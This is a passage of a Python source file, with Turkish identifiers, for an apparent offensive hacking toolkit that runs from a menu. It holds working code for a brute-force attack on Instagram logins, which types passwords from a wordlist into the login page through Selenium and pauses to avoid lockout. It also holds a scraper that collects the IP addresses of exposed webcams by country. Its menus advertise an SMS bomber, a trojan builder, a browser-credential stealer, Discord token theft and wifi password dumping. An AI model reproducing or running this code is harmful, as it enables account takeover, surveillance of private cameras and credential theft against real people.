        dosya_sifrele(dosya_yolu, anahtar)
        print("Dosya başarıyla şifrelendi.")
    elif islem == "ac":
        anahtar = anahtar_yukle()
        dosya_sifresini_ac(dosya_yolu, anahtar)
        print("Dosya başarıyla çözüldü.")
    else:
        print("Geçersiz işlem seçildi.")

def instagramSeleniumBf():
    from userInfo import email, password


    class Instagram:
        
        def __init__(self, email, password):
            
            self.browser = webdriver.Firefox()
            self.email = email
            self.password = password

        def signIn(self):
            self.browser.get("https://www.instagram.com/accounts/login/")
            t.sleep(3)

            dosya_yolu = "wordlist.txt"

            with open(dosya_yolu, "r") as dosya:
                satirlar = dosya.readlines()

            login_attempts = 0

            for satir in satirlar:
                kelime_adi = satir.strip()
                self.password = kelime_adi

                email_input = self.browser.find_element(By.XPATH, "//input[@name='username']")
                password_input = self.browser.find_element(By.XPATH, "//input[@name='password']")

                email_input.send_keys(self.email)
                password_input.send_keys(self.password)
                password_input.send_keys(Keys.ENTER)

                t.sleep(1 / 5)
                email_input.clear()
                password_input.clear()

                login_attempts += 1

                if login_attempts % 6 == 0:
                    print(f"Waiting for 10 seconds after {login_attempts} attempts...")
                    t.sleep(10)

    instgrm = Instagram(email, password)
    instgrm.signIn()

def dorkKameraları():
    
    url = "http://www.insecam.org/en/jsoncountries/"

    headers = CaseInsensitiveDict()
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    headers["Cache-Control"] = "max-age=0"
    headers["Connection"] = "keep-alive"
    headers["Host"] = "www.insecam.org"
    headers["Upgrade-Insecure-Requests"] = "1"
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"


    resp = requests.get(url, headers=headers)

    data = resp.json()
    countries = data['countries']
    os.system("cls")
    print(random_renk +"""
    ╔═╗╔═╗╔╦╗
    ║  ╠═╣║║║
    ╚═╝╩ ╩╩ ╩
    \033[1;37m+-----------------------------+
    | \033[1;31m[#] \033[1;37mDeveloper : HeJo-1 |                               
    | \033[1;31m[#] \033[1;37mVersion : 1.0.0         |
    +-----------------------------+                         
    """)


    for key, value in countries.items():
        print(f""" \033[1;30m[+] \033[1;37mCountry : {value["country"]}
    \033[1;30m[+] \033[1;37mCountry Code : ({key})
    \033[1;30m[+] \033[1;37mOnline Camera\033[1;37m(\033[1;32m{value["count"]}\033[1;37m)
    +-----------------------------------+""")
        print("")



    try:
    

        country = input(" Enter the Country Code : ")
        res = requests.get(
            f"http://www.insecam.org/en/bycountry/{country}", headers=headers
        )
        last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]

        for page in range(int(last_page)):
            res = requests.get(
                f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
                headers=headers
            )
            find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)
        
            with open(f'{country}.txt', 'w') as f:
                for ip in find_ip:
                    print("")
                    print("\033[1;30m[+] \033[1;37m", ip)
                    f.write(f'{ip}\n')
    except:
        pass
    finally:
        print("\033[1;37m")
        print('\033[37mSave File : '+country+'.txt')

        exit()

def sosyalMedyaToolları():
    print(random_renk)
    print(''' 
[1] Discord
[2] Spotify Çalma Listesi İndirici
[98] Üst Menüye Dön
[99] Çıkış
''')
    secim = input(f"HeJo@{user}:~/SosyalMedyaTooları$ ")
    if secim == "1":
        discord()
    elif secim == "2":
        spotify()
    elif secim == "98":
        main()
    elif secim == "99":
        quit()

def webTooları():
    print(random_renk)
    print('''
[1] Dork İle Derin Arama Yapma
[2] Web Sitesindeki Tüm Tıklanabilen Elementleri Bulma
[3] Dork İle Kayıtlı Kameraları İzleme
[4] Admin Paneli Tarayıcı
[98] Üst Menüye Dön
[99] Çıkış
''')
    secim = input(f"HeJo@{user}:~/WebTooları$ ")
    if secim == "1":
        dork()
    elif secim == "2":
        webTarama()
    elif secim == "3":
        dorkKameraları()
    elif secim == "4":
        adminPanelScan()
    elif secim == "98":
        main()
    elif secim == "99":
        quit()
def bruderForceTooları():
    print(random_renk)
    print('''
[1] Selenium İle İnstagrak Kaba Kuvvet Saldırısı
[2] Wordlist Oluşturucu
[98] Üst Menüye Dön
[99] Çıkış
''')
    secim = input(f"HeJo@{user}:~/BruterForceTooları$ ")
    if secim == "1":
        instagramSeleniumBf()
    elif secim == "2":
        wordlistOluşturucu()
    elif secim == "98":
        main()
    elif secim == "99":
        quit()

def DoğrudanCihazaYapılanSaldırıTooları():
    print(random_renk)
    print('''
[1]Sms Boomber
[2] Pc Killer
[3] Trojen Oluşturucu
[4] İp İle Bilgi Toplama
[5] Tarayıcıdaki Kayıtlı Her Şeyi Alma
[98] Üst Menüye Dön
[99] Çıkış
''')
    secim = input(f"HeJo@{user}:~/DoğrudanCihazaYapılanSaldırıTooları$ ")
    if secim == "1":
        sms()
    elif secim == "2":
        pcKiller()
    elif secim == "3":
        trojenOluşturucu()
    elif secim == "4":
        ipToİnformation()
    elif secim == "5":
        chrome()
    elif secim == "98":
        main()
    elif secim == "99":
        quit()

def kriptolojiTooları():
    print(random_renk)
    print('''
[1] Dosya Şifreleme
[98] Üst Menüye Dön
[99] Çıkış
''')
    secim = input(f"HeJo@{user}:~/KriptolojiTooları$ ")
    if secim == "1":
        dosyaŞifreleme()
    elif secim == "98":
        main()
    elif secim == "99":
        quit()
def istatislik():
    print(random_renk)
    print('''
[1] Kayıtlı Wifi Ağlarını ve şifrelerini Görüntüleme
[98] Üst Menüye Dön
[99] Çıkış
        ''')
    secim = input(f"HeJo@{user}:~/İstatistik$ ")
    if secim == "1":
        wifiAğları()
    elif secim == "98":
        main()
    elif secim == "99":
        quit()
def main():  
    while True:
        print(random_renk)
        print('''

     _    _               _                     ___    ___  
    | |  | |             | |                   / _ \  |__ \ 
    | |__| |   ___       | |   ___    ______  | | | |    ) |
    |  __  |  / _ \  _   | |  / _ \  |______| | | | |   / / 
    | |  | | |  __/ | |__| | | (_) |          | |_| |  / /_ 
    |_|  |_|  \___|  \____/   \___/            \___/  |____|
                                                            
                                                            
    Discord : https://discord.gg/eAknugSZZ7
    instagram : bymer_ak

    [1] Sosyal Medya Tooları
        |
        |-> Discord
            |
            |-> Token ile bilgi alma
            |-> Bilgiler ile token alma
            |-> Spam botu
            |-> Hedef kullanıcının bilgilerini değiştirme
            |-> J4J botu
        |-> Spotify Çalma Listesi İndirici
    [2] Web Tooları
        |
        |-> Dork İle Derin Arama Yapma
        |-> Web Sitesindeki Tüm Tıklanabilen Elementleri Bulma
        |-> Dork İle Kayıtlı Kameraları İzleme
        |-> Admin Paneli Tarayıcı
    [3] Brute Force Tolları
        |
        |-> Selenium İle İnstagrak Kaba Kuvvet Saldırısı
        |-> Wordlist Oluşturucu
    [4] Doğrudan Cihaza Yapılan Saldırı Tooları
        |
        |-> Sms Boomber
        |-> Pc Killer
        |-> Trojen Oluşturucu
        |-> İp İle Bilgi Toplama
        |-> Tarayıcıdaki Kayıtlı Her Şeyi Alma
    [5] Kriptoloji Tooları
        |
        |-> Dosya Şifreleme
    [6] İstatislik
        |
        |-> Kayıtlı Wifi Ağlarını ve Şifrelerini Görüntüleme
    [99] Çıkış
            

    ''')
        
        a = int(input(f"HeJo@{user}:~$ "))
        if a == 1:
            sosyalMedyaToolları()
        elif a == 2:
            webTooları()
        elif a == 3:
            bruderForceTooları()
        elif a == 4:
            DoğrudanCihazaYapılanSaldırıTooları()
        elif a == 5:
            kriptolojiTooları()
        elif a == 6:
            istatislik()
        elif a == 98:
            print('''100110001 00100000 01100001 01101100 01110111 
    01100001 01111001 01110011 00100000 01101100 
    01101111 01110110 01100101 00100000
     01101101 01111001 00100000 01100111 
    01110111 01100101 01101110 ''')
        elif a == 99:
            exit()
if __name__ == "__main__":
    main()
